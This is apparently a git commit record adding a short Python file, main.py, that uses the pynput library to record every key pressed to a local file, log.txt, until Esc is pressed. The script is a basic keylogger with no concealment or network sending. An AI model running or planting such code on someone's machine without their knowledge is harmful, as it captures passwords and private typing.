0c8e155a4f6be983e4613ce039f8f42d81db2a42
SARAN-S-04 <sarans0504@gmail.com>
2025-01-23 23:46:50 +0530

    Initial Code

---
+++ main.py
@@ -0,0 +1,13 @@
+from pynput.keyboard import Listener, Key
+
+def writeFile(key):
+    keyval = str(key)
+    with open("log.txt", 'a') as f:
+        f.write(keyval + '\n')
+
+def stopFile(key):
+    if key == Key.esc:
+        return False
+
+with Listener(on_press=writeFile, on_release=stopFile) as l:
+    l.join()
